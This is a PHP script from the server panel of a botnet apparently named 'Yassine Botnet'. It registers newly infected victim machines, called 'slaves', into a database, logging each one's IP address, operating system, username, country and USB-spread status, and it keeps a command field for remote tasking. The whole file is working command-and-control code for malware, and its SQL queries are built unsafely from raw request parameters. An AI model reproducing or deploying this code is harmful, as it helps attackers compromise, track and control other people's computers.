<!-- Sure, We Need To Insert Some Data On Database, That's Why I created This Script -->
<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
?>
<html>
<head>
<title>Yassine Botnet</title>
<link rel="stylesheet" type="text/css" href="../style/main.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../yassin.php")) 
{
$checker = fopen("../yassin.php","r");
$copyrights = fgets($checker);
if ($copyrights != "Yassin Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
<?
// Some Functions Here \\
function generateRandomString($length = 20) {
    return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $length);
}
// Defining Some Variables \\
$slave_id = generateRandomString($length = 5);
$slave_ip = getenv("REMOTE_ADDR");
$slave_os = $_GET['os'];
$install_date = $_GET['id'];
$userpc = $_GET['username'];
$country = $_GET['country'];
$usbspread = $_GET['usb'];
// CHECKING IF VICTIME ALREADY EXISTS \\
$query_check = "SELECT username FROM slaves WHERE username='$userpc'";
$result_check = mysql_query($query_check, $connect);
while($row = mysql_fetch_array($result_check)){
     $user_check =  $row[0];
}
if($userpc != $user_check )
{
$add_command = "INSERT INTO  slaves (id, ip, os, date, username, usb, command, country)
                VALUES ('$slave_id', '$slave_ip', '$slave_os', '$install_date', '$userpc', '$usbspread', 'null', '$country')";
mysql_query($add_command, $connect);
}
?>